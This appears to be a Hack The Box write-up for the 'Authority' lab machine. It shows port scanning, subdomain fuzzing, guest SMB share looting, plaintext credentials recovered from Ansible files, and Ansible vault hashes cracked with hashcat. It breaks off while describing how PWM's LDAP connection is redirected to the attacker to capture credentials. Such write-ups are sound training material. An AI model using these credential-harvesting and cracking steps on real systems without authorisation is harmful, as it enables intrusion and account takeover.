## Enum
```bash
nmap -Pn -sC -sV 10.10.11.222 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 13:06 IST
Nmap scan report for 10.10.11.222
Host is up (0.031s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-23 16:06:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-23T16:07:18+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-23T16:07:17+00:00; +4h00m01s from scanner time.
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 23 Jul 2023 16:06:59 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 23 Jul 2023 16:06:59 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sun, 23 Jul 2023 16:07:05 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-07-21T10:43:31
|_Not valid after:  2025-07-22T22:21:55
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/23%Time=64BD17E3%P=aarch64-unknown-li
SF:nux-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/
SF:html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2023
SF:\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\
SF:n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/p
SF:wm'\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow
SF::\x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:
SF:\x20Sun,\x2023\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20clos
SF:e\r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Typ
SF:e:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x2
SF:0Sun,\x2023\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=
SF:\"0;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\
SF:x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x2
SF:0en\r\nContent-Length:\x201936\r\nDate:\x20Sun,\x2023\x20Jul\x202023\x2
SF:016:07:05\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html
SF:\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20B
SF:ad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:T
SF:ahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;back
SF:ground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:1
SF:6px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{col
SF:or:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:non
SF:e;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Ba
SF:d\x20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception
SF:\x20Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\
SF:x20the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</
SF:p><p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not
SF:\x20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x
SF:20perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malform
SF:ed\x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-23T16:07:12
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
```
Visiting port 8443 gives us the domain name
[directory.png](directory.png)  

Fuzzing that we get more subdomains
```bash
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u "http://authority.htb" \
  -H "Host: FUZZ.authority.htb" -mc all -fs 703

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://authority.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.authority.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 703
________________________________________________

[Status: 400, Size: 334, Words: 21, Lines: 7, Duration: 29ms]
    * FUZZ: #www

[Status: 400, Size: 334, Words: 21, Lines: 7, Duration: 31ms]
    * FUZZ: #mail

:: Progress: [19966/19966] :: Job [1/1] :: 1162 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

And we can now also talk to the dns server
```bash
dig any authority.htb @10.10.11.222

; <<>> DiG 9.18.16-1-Debian <<>> any authority.htb @10.10.11.222
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56135
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;authority.htb.                 IN      ANY

;; ANSWER SECTION:
authority.htb.          600     IN      A       10.10.11.222
authority.htb.          3600    IN      NS      authority.authority.htb.
authority.htb.          3600    IN      SOA     authority.authority.htb. hostmaster.htb.corp. 174 900 600 86400 3600
authority.htb.          600     IN      AAAA    dead:beef::9e
authority.htb.          600     IN      AAAA    dead:beef::3331:9963:2a3e:8edc

;; ADDITIONAL SECTION:
authority.authority.htb. 3600   IN      A       10.10.11.222
authority.authority.htb. 3600   IN      AAAA    dead:beef::9e
authority.authority.htb. 3600   IN      AAAA    dead:beef::3331:9963:2a3e:8edc

;; Query time: 32 msec
;; SERVER: 10.10.11.222#53(10.10.11.222) (TCP)
;; WHEN: Sun Jul 23 13:26:08 IST 2023
;; MSG SIZE  rcvd: 265
```

Enumerating SMB
```bash
smbmap -H 10.10.11.222 -u guest
[+] IP: 10.10.11.222:445        Name: authority.authority.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```
```bash
smbclient  -U Guest --password="" //10.10.11.222/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 13:20:38 2023
  ..                                  D        0  Fri Mar 17 13:20:38 2023
  Automation                          D        0  Fri Mar 17 13:20:40 2023
```
Downloading all this locally
```bash
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\.yamllint of size 205 as Automation/Ansible/ADCS/.yamllint (1.9 KiloBytes/sec) (average 2.0 KiloBytes/sec)
...SNIP...
```

```
pwd
/home/blnkn/sec/htb/machines/authority/loot/Automation/Ansible
```
```bash
ls -la
total 24
drwxr-xr-x  6 blnkn blnkn 4096 Jul 23 13:36 .
drwxr-xr-x  3 blnkn blnkn 4096 Jul 23 13:36 ..
drwxr-xr-x  8 blnkn blnkn 4096 Jul 23 13:36 ADCS
drwxr-xr-x 10 blnkn blnkn 4096 Jul 23 13:36 LDAP
drwxr-xr-x  7 blnkn blnkn 4096 Jul 23 13:36 PWM
drwxr-xr-x  3 blnkn blnkn 4096 Jul 23 13:36 SHARE
```
```bash
tree -a .
.
├── ADCS
│   ├── .ansible-lint
│   ├── defaults
│   │   └── main.yml
│   ├── LICENSE
│   ├── meta
│   │   ├── main.yml
│   │   └── preferences.yml
│   ├── molecule
│   │   └── default
│   │       ├── converge.yml
│   │       ├── molecule.yml
│   │       └── prepare.yml
│   ├── README.md
│   ├── requirements.txt
│   ├── requirements.yml
│   ├── SECURITY.md
│   ├── tasks
│   │   ├── assert.yml
│   │   ├── generate_ca_certs.yml
│   │   ├── init_ca.yml
│   │   ├── main.yml
│   │   └── requests.yml
│   ├── templates
│   │   ├── extensions.cnf.j2
│   │   └── openssl.cnf.j2
│   ├── tox.ini
│   ├── vars
│   │   └── main.yml
│   └── .yamllint
├── LDAP
│   ├── .bin
│   │   ├── clean_vault
│   │   ├── diff_vault
│   │   └── smudge_vault
│   ├── defaults
│   │   └── main.yml
│   ├── files
│   │   └── pam_mkhomedir
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   ├── templates
│   │   ├── ldap_sudo_groups.j2
│   │   ├── ldap_sudo_users.j2
│   │   ├── sssd.conf.j2
│   │   └── sudo_group.j2
│   ├── TODO.md
│   ├── .travis.yml
│   ├── Vagrantfile
│   └── vars
│       ├── debian.yml
│       ├── main.yml
│       ├── redhat.yml
│       └── ubuntu-14.04.yml
├── PWM
│   ├── ansible.cfg
│   ├── ansible_inventory
│   ├── defaults
│   │   └── main.yml
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   └── templates
│       ├── context.xml.j2
│       └── tomcat-users.xml.j2
└── SHARE
    └── tasks
        └── main.yml

26 directories, 52 files
```

Grepping around to find interesting things  

In ADCS
```yaml
# A passphrase for the CA key.
ca_passphrase: SuP3rS3creT
```
In PWM
```yaml
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```
```yaml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```
```xml
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

```bash
./ldapsearch-ad.py -l 10.10.11.222 -t info
### Server infos ###
[+] Forest functionality level = Windows 2016
[+] Domain functionality level = Windows 2016
[+] Domain controller functionality level = Windows 2016
[+] rootDomainNamingContext = DC=authority,DC=htb
[+] defaultNamingContext = DC=authority,DC=htb
[+] ldapServiceName = authority.htb:authority$@AUTHORITY.HTB
[+] naming_contexts = ['DC=authority,DC=htb', 'CN=Configuration,DC=authority,DC=htb', 'CN=Schema,CN=Configuration,DC=authority,DC=htb', 'DC=DomainDnsZones,DC=authority,DC=htb', 'DC=ForestDnsZones,DC=authority,DC=htb']
```
[https://docs.travis-ci.com/user/environment-variables/#encrypting-environment-variables](https://docs.travis-ci.com/user/environment-variables/#encrypting-environment-variables)  
the password for the vaults seems to be stored in an env variable which is encrypted with travis-ci, I don't know if it is really possible to crack that, but we can attempt to crack the vaults directly
```bash
/usr/share/john/ansible2john.py vault.yaml > vault.in
```
```bash
hashcat -a0 vault.in /usr/share/wordlists/rockyou.txt
```
```bash
ansible-vault decrypt vault.yml --vault-password-file pass
```

With one of those we can connect to the PWM instance on 8443  

PWM version: 
```
v2.0.3 bc96802e
```

Confirming some existing users and their exact ldap bind domain from somewhere in the configuration app
```
CN=Administrator,CN=Users,DC=authority,DC=htb
CN=Guest,CN=Users,DC=authority,DC=htb
CN=krbtgt,CN=Users,DC=authority,DC=htb
```

Troubleshooting this thing in editor mode to connect it to the ldap instance:
![]()  

This means it has a valid user:password to connect to ldap, and since we can control where to point it to, we can just point it to ourselves:
![]()  


